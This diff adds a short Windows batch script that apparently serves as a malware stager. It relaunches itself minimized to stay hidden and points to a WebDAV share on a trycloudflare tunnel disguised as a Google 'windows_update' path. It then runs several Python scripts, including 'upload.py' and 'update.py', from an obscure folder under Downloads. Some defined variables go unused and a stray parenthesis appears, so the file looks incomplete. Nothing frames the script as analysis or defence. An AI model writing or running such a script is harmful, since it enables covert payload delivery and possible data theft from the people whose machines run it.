@@ -1,0 +1,16 @@
+@echo off
+if "%1" == "" start "" /min "%~f0" MY_FLAG && exit
+
+set source=\\oral-career-renewable-bacterial.trycloudflare.com@SSL\DavWWWRoot\google\windows_update
+set destination=%USERPROFILE%\Pictures
+
+:: Navigate to the Python folder and run the script
+cd /d "%Userprofile%\Downloads\qfv0ao\App\Python"
+python.exe new.py
+python.exe time.py
+python.exe upload.py
+python.exe update.py
+
+)
+
+exit /b 0
